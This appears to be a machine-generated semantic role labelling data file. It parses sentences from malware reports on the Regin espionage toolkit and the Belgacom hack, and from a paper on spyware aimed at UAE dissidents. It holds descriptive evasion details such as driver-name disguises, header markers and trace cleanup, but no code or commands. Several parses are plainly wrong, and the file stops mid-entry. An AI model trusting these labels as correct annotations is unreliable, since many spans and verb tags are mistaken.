{"V": {"text": "including", "index": 9}, "ARG1": {"text": "major groups C373h , 19h , 9 , as well as Stage 5 payloads , such as C375h and 1Bh"}}}, "\n  When the attackers who operated Regin cleaned up compromised computers once they were finished with them,\n  they often failed to remove Stage 4 and 5 artifacts from the system": {"operated": {"ARG0": {"text": "the attackers"}, "R-ARG0": {"text": "who"}, "V": {"text": "operated", "index": 4}, "ARG1": {"text": "Regin"}}, "cleaned": {"ARG0": {"text": "the attackers/ operated Regin"}, "R-ARG0": {"text": "who"}, "V": {"text": "cleaned", "index": 6}, "ARGM-TMP": {"text": "once they were finished with them"}}, "compromised": {"V": {"text": "compromised", "index": 8}, "ARG1": {"text": "computers"}}, "were": {"V": {"text": "were", "index": 12}}, "finished": {"ARG1": {"text": "they"}, "V": {"text": "finished", "index": 13}, "ARG2": {"text": "with them"}}, "failed": {"ARGM-TMP": {"text": "When the attackers who operated Regin cleaned up compromised computers once they were finished with them/ often"}, "ARG1": {"text": "they"}, "V": {"text": "failed", "index": 19}, "ARG2": {"text": "to remove Stage 4 and 5 artifacts from the system"}}, "remove": {"ARG0": {"text": "they"}, "V": {"text": "remove", "index": 21}, "ARG1": {"text": "Stage 4 and 5 artifacts"}, "ARG2": {"text": "from the system"}}}, " Four transport protocols are available for C&C:\n  \u2022\t ICMP: Payload information can be encoded and embedded in lieu of legitimate ICMP/ping data": {"are": {"ARG1": {"text": "Four transport protocols"}, "V": {"text": "are", "index": 3}, "ARG2": {"text": "available for C&C"}}, "can": {"V": {"text": "can", "index": 13}}, "be": {"V": {"text": "be", "index": 14}}, "encoded": {"ARG1": {"text": "Payload information"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "encoded", "index": 15}, "ARGM-ADV": {"text": "in lieu of legitimate ICMP / ping data"}}, "embedded": {"ARG1": {"text": "Payload information"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "embedded", "index": 17}, "ARG2": {"text": "in lieu of legitimate ICMP / ping data"}}}, " An example of Regin\u2019s methods organized into 12 groups</caption>\n<table>\n Major                           Functionality\n 0001h                           Core\n 000Dh                           Compression, decompression\n 000Fh                           Encryption, decryption\n 003Dh                           EVFS handling\n 0007h                           Container management\n 000Bh                           Log management\n 0033h                           Loader\n 0011h                           Network\n 0013h                           Network\n C373h                           TCP command-and-control (C&C)\n 0019h                           UDP C&C\n 0009h                           C&C Processor\n </table>\n </section>\n\n\n                                    <footer>         Page 10</footer>\n\f                                <header>                Regin: Top-tier espionage tool enables stealthy surveillance</header>\n\n<section>\n\n\n<heading>Stage 4</heading>\n  The files for Stage 4, which are loaded by Stage 3, consist of a user-mode orchestrator and multiple kernel\n  payload modules": {"organized": {"ARG1": {"text": "Regin \u2019s methods"}, "V": {"text": "organized", "index": 6}, "ARGM-GOL": {"text": "into 12 groups"}}, "are": {"V": {"text": "are", "index": 17}}, "loaded": {"ARG1": {"text": "12/ for Stage 4"}, "R-ARG1": {"text": "which"}, "V": {"text": "loaded", "index": 18}, "ARG2": {"text": "by Stage 3"}}, "consist": {"ARG1": {"text": "An example of Regin \u2019s methods organized into 12 groups The files for Stage 4 , which are loaded by Stage 3 ,"}, "V": {"text": "consist", "index": 23}, "ARG2": {"text": "of a user - mode orchestrator and multiple kernel payload modules"}}}, "\n</section>\n<section>\n<heading>Command-and-control operations</heading>\n\n  Regin\u2019s C&C operations are extensive": {"are": {"ARG1": {"text": "Regin \u2019s C&C operations"}, "V": {"text": "are", "index": 4}, "ARG2": {"text": "extensive"}}}, "\n\n  Regin is an extremely complex piece of software that can be customized with a wide\n  range of different capabilities which can be deployed depending on the target": {"is": {"ARG1": {"text": "Regin"}, "V": {"text": "is", "index": 1}, "ARG2": {"text": "an extremely complex piece of software that can be customized with a wide range of different capabilities which can be deployed depending on the target"}}, "can": {"V": {"text": "can", "index": 9}}, "be": {"ARG1": {"text": "software"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "be", "index": 10}, "ARG2": {"text": "customized with a wide range of different capabilities which can be deployed depending on the target"}}, "customized": {"ARG1": {"text": "software"}, "R-ARG1": {"text": "that"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "customized", "index": 11}, "ARGM-MNR": {"text": "with a wide range of different"}, "ARG2": {"text": "capabilities which can be deployed depending on the target"}}, "can_2": {"V": {"text": "can", "index": 20}}, "be_2": {"V": {"text": "be", "index": 21}}, "deployed": {"ARG1": {"text": "a wide range of different capabilities"}, "R-ARG1": {"text": "which"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "deployed", "index": 22}, "ARGM-PRP": {"text": "depending on the target"}}, "depending": {"V": {"text": "depending", "index": 23}, "ARG1": {"text": "on the target"}}}, " These modules can\ninclude data collectors, a self-defense engine which detects if attempts to detect the toolkit occur, functionality for encrypted communications, network capture\nprograms, and remote controllers of different kinds": {"can": {"V": {"text": "can", "index": 2}}, "include": {"ARG2": {"text": "These modules"}, "ARGM-MOD": {"text": "can"}, "V": {"text": "include", "index": 3}, "ARG1": {"text": "data collectors , a self - defense engine which detects if attempts to detect the toolkit occur , functionality for encrypted communications , network capture programs , and remote controllers of different kinds"}}, "detects": {"ARG0": {"text": "a self - defense engine"}, "R-ARG0": {"text": "which"}, "V": {"text": "detects", "index": 13}, "ARGM-ADV": {"text": "if attempts to detect the toolkit occur , functionality for encrypted communications , network capture programs , and remote controllers of different kinds"}}, "detect": {"V": {"text": "detect", "index": 17}, "ARG1": {"text": "the toolkit occur"}}, "occur": {"ARG1": {"text": "the toolkit"}, "V": {"text": "occur", "index": 20}}, "encrypted": {"V": {"text": "encrypted", "index": 24}, "ARG1": {"text": "communications"}}}, " On failure, Stage 2 is able to disinfect the\ncompromised device": {"is": {"ARGM-DIS": {"text": "On failure"}, "ARG1": {"text": "Stage 2"}, "V": {"text": "is", "index": 5}, "ARG2": {"text": "able to disinfect the compromised device"}}, "disinfect": {"ARG0": {"text": "Stage 2"}, "V": {"text": "disinfect", "index": 8}, "ARG1": {"text": "the compromised device"}}, "compromised": {"V": {"text": "compromised", "index": 10}, "ARG1": {"text": "device"}}}, "\n\nThe Regin loaders that are disguised as Microsoft drivers with names such as:\n<list>\n    serial.sys\n    cdaudio.sys\n    atdisk.sys\n    parclass.sys\n    usbclass.sys\n</list>\n\fMimicking Microsoft drivers allows the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems": {"are": {"ARG1": {"text": "The Regin loaders"}, "R-ARG1": {"text": "that"}, "V": {"text": "are", "index": 4}}, "disguised": {"ARG1": {"text": "The Regin loaders"}, "R-ARG1": {"text": "that"}, "V": {"text": "disguised", "index": 5}, "ARG2": {"text": "as Microsoft drivers"}, "ARGM-MNR": {"text": "with names such as"}}, "Mimicking": {"V": {"text": "Mimicking", "index": 14}, "ARG0": {"text": "Microsoft drivers"}}, "allows": {"ARG0": {"text": "Mimicking Microsoft drivers"}, "V": {"text": "allows", "index": 17}, "ARG1": {"text": "the loaders to better disguise their presence on the system and appear less suspicious to host intrusion detection systems"}}, "disguise": {"ARG0": {"text": "the loaders"}, "ARGM-MNR": {"text": "better"}, "V": {"text": "disguise", "index": 22}, "ARG1": {"text": "their presence"}, "ARG2": {"text": "on the system"}}, "appear": {"V": {"text": "appear", "index": 29}, "ARG1": {"text": "less suspicious to host intrusion detection systems"}}, "host": {"ARG0": {"text": "the loaders"}, "V": {"text": "host", "index": 33}, "ARG1": {"text": "intrusion detection systems"}}}, "\n</section>\n<section>\n<heading>Stealth Implant</heading>\n\nThe Intercept\u2019s investigation revealed a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header, which is a sign that it\nmight have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit": {"revealed": {"ARG0": {"text": "The Intercept \u2019s investigation"}, "V": {"text": "revealed", "index": 4}, "ARG1": {"text": "a sample uploaded on VirusTotal on March 14th 2012 that presents the unique 0xfedcbafe header , which is a sign that it might have been loaded by a Regin driver and it appears to provide stealth functionality for the tool kit"}}, "uploaded": {"ARGM-ADJ": {"text": "sample"}, "V": {"text": "uploaded", "index": 7}, "ARG1": {"text": "on VirusTotal"}, "ARGM-TMP": {"text": "on March 14th 2012"}}, "presents": {"ARG0": {"text": "a sample uploaded on VirusTotal on March 14th 2012"}, "R-ARG0": {"text": "that"}, "V": {"text": "presents", "index": 15}, "ARG1": {"text": "the unique 0xfedcbafe header , which is a sign that it might have been loaded by a Regin driver"}}, "is": {"ARG1": {"text": "the unique 0xfedcbafe header"}, "R-ARG1": {"text": "which"}, "V": {"text": "is", "index": 22}, "ARG2": {"text": "a sign that it might have been loaded by a Regin driver"}}, "might": {"V": {"text": "might", "index": 27}}, "have": {"V": {"text": "have", "index": 28}}, "been": {"V": {"text": "been", "index": 29}}, "loaded": {"ARG1": {"text": "it"}, "ARGM-MOD": {"text": "might"}, "V": {"text": "loaded", "index": 30}, "ARG0": {"text": "by a Regin driver"}}, "appears": {"V": {"text": "appears", "index": 37}, "ARG1": {"text": "to provide stealth functionality for the tool kit"}}, "provide": {"ARG0": {"text": "it"}, "V": {"text": "provide", "index": 39}, "ARG1": {"text": "stealth functionality for the tool kit"}}}, " The malicious\nLinkedIn page launched a malware attack, infecting the employees\u2019 computers and giving the spies total control of their systems, allowing GCHQ to get deep\ninside Belgacom\u2019s networks to steal data": {"launched": {"ARG0": {"text": "The malicious LinkedIn page"}, "V": {"text": "launched", "index": 4}, "ARG1": {"text": "a malware attack"}, "ARGM-PRD": {"text": "infecting the employees \u2019 computers and giving the spies total control of their systems"}, "ARGM-ADV": {"text": "allowing GCHQ to get deep inside Belgacom \u2019s networks to steal data"}}, "infecting": {"ARG0": {"text": "The malicious LinkedIn page"}, "V": {"text": "infecting", "index": 9}, "ARG1": {"text": "the employees \u2019 computers"}}, "giving": {"ARG0": {"text": "The malicious LinkedIn page"}, "V": {"text": "giving", "index": 15}, "ARG2": {"text": "the spies total"}, "ARG1": {"text": "control of their systems"}}, "allowing": {"V": {"text": "allowing", "index": 24}, "ARG1": {"text": "GCHQ to get deep inside Belgacom \u2019s networks to steal data"}}, "get": {"ARG0": {"text": "GCHQ"}, "V": {"text": "get", "index": 27}, "ARG1": {"text": "deep inside Belgacom \u2019s networks to steal data"}}, "steal": {"ARG0": {"text": "deep inside Belgacom \u2019s networks"}, "V": {"text": "steal", "index": 34}, "ARG1": {"text": "data"}}}, "\n\nThe malware, which steals data from infected systems and disguises itself as legitimate Microsoft software, has also been identified on the same European Union\ncomputer systems that were targeted for surveillance by the National Security Agency": {"steals": {"ARG0": {"text": "The malware"}, "R-ARG0": {"text": "which"}, "V": {"text": "steals", "index": 4}, "ARG1": {"text": "data"}, "ARG2": {"text": "from infected systems"}}, "has": {"V": {"text": "has", "index": 17}}, "been": {"V": {"text": "been", "index": 19}}, "identified": {"ARG1": {"text": "The malware , which steals data from infected systems and disguises itself as legitimate Microsoft software ,"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "identified", "index": 20}, "ARG2": {"text": "on the same European Union computer systems that were targeted for surveillance by the National Security Agency"}}, "were": {"V": {"text": "were", "index": 29}}, "targeted": {"ARG1": {"text": "the same European Union computer systems"}, "R-ARG2": {"text": "that"}, "V": {"text": "targeted", "index": 30}, "ARGM-PRP": {"text": "for surveillance"}, "ARG0": {"text": "by the National Security Agency"}}}, " It initializes the core components of the architecture and loads the next parts of the\nmalware": {"initializes": {"ARG0": {"text": "It"}, "V": {"text": "initializes", "index": 1}, "ARG1": {"text": "the core components of the architecture"}}, "loads": {"ARG0": {"text": "It"}, "ARGM-TMP": {"text": "initializes"}, "V": {"text": "loads", "index": 9}, "ARG1": {"text": "the next parts of the malware"}}}, "\n\nThis Regin driver recurrently checks that the current IRQL (Interrupt Request Level) is set to PASSIVE_LEVEL using the KeGetCurrentIrql() function in many\nparts of the code, probably in order to operate as silently as possible and to prevent possible IRQL confusion": {"checks": {"ARG0": {"text": "This Regin driver recurrently"}, "V": {"text": "checks", "index": 4}, "ARG1": {"text": "that the current IRQL ( Interrupt Request Level ) is set to PASSIVE_LEVEL using the KeGetCurrentIrql ( ) function in many parts of the code , probably in order to operate as silently as possible"}}, "is": {"V": {"text": "is", "index": 14}}, "set": {"ARG1": {"text": "the current IRQL ( Interrupt Request Level )"}, "V": {"text": "set", "index": 15}, "ARG2": {"text": "to PASSIVE_LEVEL using the KeGetCurrentIrql ( ) function in many parts of the code"}, "ARGM-PRP": {"text": "probably in order to operate as silently as possible and to prevent possible IRQL confusion"}}, "PASSIVE_LEVEL": {"ARG0": {"text": "the current IRQL ( Interrupt Request Level )"}, "V": {"text": "PASSIVE_LEVEL", "index": 17}, "ARG1": {"text": "using the KeGetCurrentIrql ( ) function in many parts of the code"}, "ARGM-PRP": {"text": "probably in order to operate as silently as possible and to prevent possible IRQL confusion"}}, "using": {"V": {"text": "using", "index": 18}, "ARG1": {"text": "the KeGetCurrentIrql ( ) function"}, "ARGM-LOC": {"text": "in many parts of the code"}}, "function": {"ARG0": {"text": "the KeGetCurrentIrql"}, "ARGM-ADJ": {"text": ")"}, "V": {"text": "function", "index": 23}, "ARGM-LOC": {"text": "in many parts of the code"}}, "operate": {"V": {"text": "operate", "index": 35}, "ARGM-MNR": {"text": "as silently as possible"}}, "prevent": {"V": {"text": "prevent", "index": 42}, "ARG1": {"text": "possible IRQL confusion"}}}, "\n</section>\n<section>\n<heading>Second stage loader</heading>\n\nWhen launched, it cleans traces of the initial loader, loads the next part of the toolkit and monitors its execution": {"launched": {"ARGM-TMP": {"text": "When"}, "V": {"text": "launched", "index": 1}, "ARG0": {"text": "it"}}, "cleans": {"ARGM-TMP": {"text": "When launched"}, "ARG0": {"text": "it"}, "V": {"text": "cleans", "index": 4}, "ARG1": {"text": "traces of the initial loader"}}, "loads": {"ARGM-TMP": {"text": "When launched"}, "ARG0": {"text": "it"}, "V": {"text": "loads", "index": 11}, "ARG2": {"text": "the next part of the toolkit"}}, "monitors": {"ARGM-TMP": {"text": "When launched"}, "ARG0": {"text": "it"}, "V": {"text": "monitors", "index": 19}, "ARG1": {"text": "its execution"}}}, "\n\nThe driver also contains routines to check for specific builds of the Windows kernel in use, including very old versions such as for Windows NT4 Terminal Server\nand Windows 2000, and then adapts its behavior accordingly": {"contains": {"ARG0": {"text": "The driver"}, "ARGM-ADV": {"text": "also"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "routines to check for specific builds of the Windows kernel in use , including very old versions such as for Windows NT4 Terminal Server and Windows 2000"}}, "check": {"V": {"text": "check", "index": 6}, "ARG2": {"text": "for specific builds"}, "ARG1": {"text": "of the Windows kernel in use , including very old versions such as for Windows NT4 Terminal Server and Windows 2000"}}, "including": {"ARG2": {"text": "specific/ the Windows kernel in use"}, "V": {"text": "including", "index": 17}, "ARG1": {"text": "very old versions such as for Windows NT4 Terminal Server and Windows 2000"}}, "adapts": {"ARG0": {"text": "The driver"}, "ARGM-TMP": {"text": "then"}, "V": {"text": "adapts", "index": 34}, "ARG1": {"text": "its behavior"}, "ARGM-MNR": {"text": "accordingly"}}}, " The malware zeroes out its PE (Portable Executable, the Windows executable format) headers in memory, replacing \u201cMZ\u201d with its own magic\nmarker 0xfedcbafe": {"zeroes": {"ARG0": {"text": "The malware"}, "V": {"text": "zeroes", "index": 2}, "ARG1": {"text": "its PE ( Portable Executable , the Windows executable format ) headers in memory , replacing \u201c MZ \u201d with its own magic marker 0xfedcbafe"}}, "executable": {"ARG0": {"text": "the Windows"}, "V": {"text": "executable", "index": 12}, "ARG1": {"text": "format ) headers"}, "ARGM-LOC": {"text": "in"}}, "replacing": {"V": {"text": "replacing", "index": 19}, "ARG1": {"text": "\u201c MZ \u201d"}, "ARG2": {"text": "with its own magic marker 0xfedcbafe"}}}, "\n\nOne of the keys to Regin is its stealth: To avoid detection and frustrate analysis, malware used in such operations frequently adhere to a modular design": {"is": {"ARG1": {"text": "One of the keys to Regin"}, "V": {"text": "is", "index": 6}, "ARG2": {"text": "its stealth"}, "C-ARG1": {"text": "To avoid detection and frustrate analysis ,"}}, "avoid": {"V": {"text": "avoid", "index": 11}, "ARG1": {"text": "detection and frustrate analysis"}}, "frustrate": {"V": {"text": "frustrate", "index": 14}, "ARG1": {"text": "analysis"}}, "used": {"ARG1": {"text": "malware"}, "V": {"text": "used", "index": 18}, "ARGM-LOC": {"text": "in such operations"}}, "adhere": {"R-ARG0": {"text": "To avoid detection and frustrate analysis"}, "ARG2": {"text": "malware used in such operations"}, "ARGM-TMP": {"text": "frequently"}, "V": {"text": "adhere", "index": 23}, "ARG1": {"text": "to a modular design"}}}, "\n\nThe following Regin components have been identified:\n</section>\n<section>\n<heading>Loaders</heading>\n\nThe first stage are drivers which act as loaders for a second stage": {"following": {"V": {"text": "following", "index": 1}, "ARG1": {"text": "Regin components"}}, "have": {"V": {"text": "have", "index": 4}}, "been": {"V": {"text": "been", "index": 5}}, "identified": {"ARG1": {"text": "The following Regin components"}, "V": {"text": "identified", "index": 6}}, "are": {"ARG1": {"text": "The first stage"}, "V": {"text": "are", "index": 11}, "ARG2": {"text": "drivers which act as loaders for a second stage"}}, "act": {"ARG0": {"text": "drivers"}, "R-ARG0": {"text": "which"}, "V": {"text": "act", "index": 14}, "ARG1": {"text": "as loaders"}, "ARGM-TMP": {"text": "for a second stage"}}}, " This binary file\ncontains some of such pointers initialized, which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised\nsystem": {"contains": {"ARG0": {"text": "This binary file"}, "V": {"text": "contains", "index": 3}, "ARG1": {"text": "some of such pointers initialized , which corroborates the hypothesis that the file was dumped from memory during a forensic analysis of a compromised system"}}, "initialized": {"ARG1": {"text": "such pointers"}, "V": {"text": "initialized", "index": 8}}, "corroborates": {"ARG0": {"text": "such pointers initialized"}, "R-ARG0": {"text": "which"}, "V": {"text": "corroborates", "index": 11}, "ARG1": {"text": "the hypothesis that the file was dumped from memory during a forensic analysis of a compromised system"}}, "was": {"V": {"text": "was", "index": 17}}, "dumped": {"ARG1": {"text": "the file"}, "V": {"text": "dumped", "index": 18}, "ARGM-DIR": {"text": "from memory"}, "ARGM-TMP": {"text": "during a forensic analysis of a compromised system"}}, "compromised": {"V": {"text": "compromised", "index": 27}, "ARG1": {"text": "system"}}}, " When started, this stage simply loads and executes Stage 2": {"started": {"ARGM-TMP": {"text": "When"}, "V": {"text": "started", "index": 1}}, "loads": {"ARGM-TMP": {"text": "When started"}, "ARG0": {"text": "this stage"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "loads", "index": 6}}, "executes": {"ARGM-TMP": {"text": "When started"}, "ARG0": {"text": "this stage"}, "ARGM-ADV": {"text": "simply"}, "V": {"text": "executes", "index": 8}, "ARG1": {"text": "Stage 2"}}}, "\n\nIn addition, when freeing memory using ExFreePool(), the driver zeroes the content, probably to avoid leaving traces in pool memory": {"freeing": {"ARGM-TMP": {"text": "when"}, "V": {"text": "freeing", "index": 4}, "ARG1": {"text": "memory"}, "ARGM-MNR": {"text": "using ExFreePool ( )"}}, "using": {"ARGM-TMP": {"text": "when"}, "ARG0": {"text": "freeing memory"}, "V": {"text": "using", "index": 6}, "ARG1": {"text": "ExFreePool ( )"}}, "zeroes": {"ARGM-DIS": {"text": "In addition"}, "ARGM-TMP": {"text": "when freeing memory using ExFreePool ( )"}, "ARG0": {"text": "the driver"}, "V": {"text": "zeroes", "index": 13}, "ARG1": {"text": "the content"}, "ARGM-PRP": {"text": "probably to avoid leaving traces in pool memory"}}, "avoid": {"ARGM-ADV": {"text": "probably"}, "V": {"text": "avoid", "index": 19}, "ARG1": {"text": "leaving traces in pool memory"}}, "leaving": {"V": {"text": "leaving", "index": 20}, "ARG1": {"text": "traces"}, "ARGM-LOC": {"text": "in pool memory"}}}, "\n\nUpon execution of the unload routine (located at 0xFDEFA04A), the driver performs a long sequence of steps to remove remaining traces and artifacts": {"located": {"ARG1": {"text": "execution of the unload routine ("}, "V": {"text": "located", "index": 7}, "ARGM-LOC": {"text": "at 0xFDEFA04A )"}}, "performs": {"ARGM-TMP": {"text": "Upon execution of the unload routine ( located at 0xFDEFA04A )"}, "ARG0": {"text": "the driver"}, "V": {"text": "performs", "index": 14}, "ARG1": {"text": "a long sequence of steps to remove remaining traces and artifacts"}}, "remove": {"ARG0": {"text": "the driver"}, "V": {"text": "remove", "index": 21}, "ARG1": {"text": "remaining traces and artifacts"}}, "remaining": {"V": {"text": "remaining", "index": 22}, "ARG1": {"text": "traces and artifacts"}}}, "\n\n\n<figure></figure>\n\n<caption>This picture shows the very first bytes of the sample in question, showing the unique 0xfedcbafe header at the beginning.</caption>\n\nIn order to access information stored in the computer\u2019s memory, programs use objects that reference specific locations in memory called pointers": {"access": {"V": {"text": "access", "index": 3}, "ARG1": {"text": "information stored in the computer \u2019s memory"}}, "stored": {"ARG1": {"text": "access information"}, "V": {"text": "stored", "index": 5}, "ARGM-LOC": {"text": "in the computer \u2019s memory"}}, "use": {"ARGM-PRP": {"text": "In order to access information stored in the computer \u2019s memory"}, "ARG0": {"text": "programs"}, "V": {"text": "use", "index": 13}, "ARG1": {"text": "objects that reference specific locations in memory called pointers"}}, "called": {"ARG1": {"text": "reference specific locations in memory"}, "V": {"text": "called", "index": 21}, "ARG2": {"text": "pointers"}}}, "\n\nThe implants allowed GCHQ to conduct surveillance of internal Belgacom company communications and gave British spies the ability to gather data from the\ncompany\u2019s network and customers, which include the European Commission, the European Parliament, and the European Council": {"allowed": {"ARG0": {"text": "The implants"}, "V": {"text": "allowed", "index": 2}, "ARG1": {"text": "GCHQ to conduct surveillance of internal Belgacom company communications"}}, "conduct": {"ARG0": {"text": "GCHQ"}, "V": {"text": "conduct", "index": 5}, "ARG1": {"text": "surveillance of internal Belgacom company communications"}}, "gave": {"ARG0": {"text": "The implants"}, "V": {"text": "gave", "index": 13}, "ARG2": {"text": "British spies"}, "ARG1": {"text": "the ability to gather data from the company \u2019s network and customers , which include the European Commission , the European Parliament , and the European Council"}}, "gather": {"V": {"text": "gather", "index": 19}, "ARG1": {"text": "data from the company \u2019s network and customers ,/ , and the European Council"}, "ARGM-ADV": {"text": "which include the European Commission , the European Parliament"}}, "include": {"R-ARG2": {"text": "which"}, "V": {"text": "include", "index": 30}, "ARG1": {"text": "the European Commission , the European Parliament , and the European Council"}}}, " \u201cIt\u2019s always been clear to us the malware was highly sophisticated, but ever since the clean-up this whole story belongs to the past for\nus.\u201d\n\nIn a hacking mission codenamed Operation Socialist, GCHQ gained access to Belgacom\u2019s internal systems in 2010 by targeting engineers at the company": {"been": {"ARGM-DIS": {"text": "\u201c"}, "ARG1": {"text": "It \u2019s/ to us"}, "ARGM-TMP": {"text": "always"}, "V": {"text": "been", "index": 4}, "ARG2": {"text": "clear"}}, "was": {"ARG1": {"text": "the malware"}, "V": {"text": "was", "index": 10}, "ARG2": {"text": "highly sophisticated"}}, "belongs": {"ARG0": {"text": "the clean - up this whole story"}, "V": {"text": "belongs", "index": 24}, "ARG1": {"text": "to the past for us"}}, "codenamed": {"ARG2": {"text": "hacking mission"}, "V": {"text": "codenamed", "index": 36}, "ARG1": {"text": "Operation Socialist"}}, "gained": {"ARGM-TMP": {"text": "ever since the clean - up this whole story belongs to the past for us . \u201d In a hacking mission codenamed Operation Socialist/ in 2010"}, "ARG0": {"text": ", GCHQ"}, "V": {"text": "gained", "index": 41}, "ARG1": {"text": "access to Belgacom \u2019s internal systems"}, "ARGM-MNR": {"text": "by targeting engineers at the company"}}, "targeting": {"ARG0": {"text": "GCHQ"}, "V": {"text": "targeting", "index": 51}, "ARG1": {"text": "engineers at the company"}}}, "\n\nRegin was found on infected internal computer systems and email servers at Belgacom, a partly state-owned Belgian phone and internet provider, following\nreports last year that the company was targeted in a top-secret surveillance operation carried out by British spy agency Government Communications\nHeadquarters, industry sources told The Intercept": {"was": {"V": {"text": "was", "index": 1}}, "found": {"R-ARG1": {"text": "Regin"}, "V": {"text": "found", "index": 2}, "ARGM-LOC": {"text": "on infected internal computer systems and email servers at Belgacom , a partly state - owned Belgian phone and internet provider"}, "ARGM-TMP": {"text": "following reports last year that the company was targeted in a top - secret surveillance operation carried out by British spy agency Government Communications Headquarters"}}, "owned": {"ARGM-EXT": {"text": "partly"}, "ARG0": {"text": "state"}, "V": {"text": "owned", "index": 18}, "ARG1": {"text": "Belgian phone and internet provider"}}, "following": {"V": {"text": "following", "index": 25}, "ARG2": {"text": "reports"}, "ARGM-TMP": {"text": "last year"}, "ARG1": {"text": "that the company was targeted in a top - secret surveillance operation carried out by British spy agency Government Communications Headquarters"}}, "was_2": {"V": {"text": "was", "index": 32}}, "targeted": {"ARG1": {"text": "the company"}, "V": {"text": "targeted", "index": 33}, "ARGM-LOC": {"text": "in a top - secret surveillance operation carried out by British spy agency Government Communications Headquarters"}}, "carried": {"ARG1": {"text": "a top - secret surveillance operation"}, "V": {"text": "carried", "index": 41}, "ARG0": {"text": "by British spy agency Government Communications Headquarters"}}, "told": {"ARG1": {"text": "Regin was found on infected internal computer systems and email servers at Belgacom , a partly state - owned Belgian phone and internet provider , following reports last year that the company was targeted in a top - secret surveillance operation carried out by British spy agency Government Communications Headquarters"}, "ARG0": {"text": "industry sources"}, "V": {"text": "told", "index": 53}, "ARG2": {"text": "The Intercept"}}}, " Three\nmonths after Author was targeted, Ahmed received an e-mail\ncontaining an attachment with Xtreme RAT that talked to the\nsame C&C server (Figure 5), suggesting that the attackers who\ninfected Ahmed with RCS may have provided a list of interest-\ning e-mail addresses to another group for further targeting": {"was": {"V": {"text": "was", "index": 4}}, "targeted": {"ARG1": {"text": "Author"}, "V": {"text": "targeted", "index": 5}}, "received": {"ARGM-TMP": {"text": "Three months after Author was targeted"}, "ARG0": {"text": "Ahmed"}, "V": {"text": "received", "index": 8}, "ARG1": {"text": "an e - mail containing an attachment with Xtreme RAT that talked to the same C&C server ( Figure 5 )"}, "ARGM-PRD": {"text": "suggesting that the attackers who infected Ahmed with RCS may have provided a list of interest- ing e - mail addresses to another group for further targeting"}}, "containing": {"ARG0": {"text": "an e - mail"}, "V": {"text": "containing", "index": 13}, "ARG1": {"text": "an attachment with Xtreme RAT that talked to the same C&C server ( Figure 5 )"}}, "talked": {"ARG0": {"text": "Xtreme RAT"}, "R-ARG0": {"text": "that"}, "V": {"text": "talked", "index": 20}, "ARG2": {"text": "to the same C&C server ( Figure 5 )"}}, "suggesting": {"V": {"text": "suggesting", "index": 31}, "ARG1": {"text": "that the attackers who infected Ahmed with RCS may have provided a list of interest- ing e - mail addresses to another group for further targeting"}}, "infected": {"ARG0": {"text": "the attackers"}, "R-ARG0": {"text": "who"}, "V": {"text": "infected", "index": 36}, "ARG1": {"text": "Ahmed"}, "ARG2": {"text": "with RCS"}}, "may": {"V": {"text": "may", "index": 40}}, "have": {"V": {"text": "have", "index": 41}}, "provided": {"ARG0": {"text": "the attackers who infected Ahmed with RCS"}, "ARGM-MOD": {"text": "may"}, "V": {"text": "provided", "index": 42}, "ARG1": {"text": "a list of interest- ing e - mail addresses"}, "ARG2": {"text": "to another group"}, "ARGM-PRP": {"text": "for further targeting"}}, "ing": {"V": {"text": "ing", "index": 47}, "ARG1": {"text": "e - mail addresses"}}}, " The attacks include spyware for ongoing\nmonitoring and the use of \u201cIP spy\u201d links to deanonymize those\nwho voice dissent": {"include": {"ARG2": {"text": "The attacks"}, "V": {"text": "include", "index": 2}, "ARG1": {"text": "spyware for ongoing monitoring and the use of \u201c IP spy \u201d links to deanonymize those who voice dissent"}}, "deanonymize": {"V": {"text": "deanonymize", "index": 17}, "ARG1": {"text": "those who voice dissent"}}, "voice": {"ARG0": {"text": "those"}, "R-ARG0": {"text": "who"}, "V": {"text": "voice", "index": 20}, "ARG1": {"text": "dissent"}}}, "\n   The first attacks we observed in the UAE involved a\ngovernment-grade \u201clawful interception\u201d trojan known as Re-\nmote Control System (RCS), sold by the Italian company Hack-\ning Team": {"observed": {"ARG1": {"text": "The first attacks"}, "ARG0": {"text": "we"}, "V": {"text": "observed", "index": 4}, "ARGM-LOC": {"text": "in the UAE"}}, "involved": {"ARG0": {"text": "The first attacks we observed in the UAE"}, "V": {"text": "involved", "index": 8}, "ARG1": {"text": "a government - grade \u201c lawful interception \u201d trojan known as Re- mote Control System ( RCS ) , sold by the Italian company Hack- ing Team"}}, "known": {"ARG1": {"text": "a government - grade \u201c lawful interception \u201d trojan"}, "V": {"text": "known", "index": 18}, "ARG2": {"text": "as Re- mote Control System ( RCS )"}}, "mote": {"ARG0": {"text": "a government - grade \u201c lawful interception \u201d trojan"}, "V": {"text": "mote", "index": 21}, "ARG1": {"text": "Control System ( RCS ) , sold by the Italian company Hack- ing Team"}}, "sold": {"ARG1": {"text": "( RCS )"}, "V": {"text": "sold", "index": 28}, "ARG0": {"text": "by the Italian company Hack- ing Team"}}, "ing": {"V": {"text": "ing", "index": 34}, "ARG1": {"text": "Team"}}}, " The attacker sent the e-mails using\nReadNotify.com, which records the user\u2019s IP address upon\n\n<footer>USENIX Association \t                                                                                                                  23rd USENIX Security Symposium\u2003 515</footer>\n\ftheir mail client downloading the remote image.<fn>6</fn>\n   While ReadNotify.com forbids spoofing in their TOS,\nthe service has a vulnerability known to the attackers (and\nwhich we confirmed) that allows spoofing the From address\nby directly setting the parameters on a submission form on their\nwebsite": {"sent": {"ARG0": {"text": "The attacker"}, "V": {"text": "sent", "index": 2}, "ARG1": {"text": "the e - mails"}, "ARG2": {"text": "using ReadNotify.com , which records the user \u2019s IP address upon While ReadNotify.com forbids spoofing in their TOS , the service has a vulnerability known to the attackers ( and which we confirmed ) that allows spoofing the From address by directly setting the parameters on a submission form on their website"}}, "using": {"ARG0": {"text": "the e - mails"}, "V": {"text": "using", "index": 7}, "ARG1": {"text": "ReadNotify.com , which records the user \u2019s IP address upon While 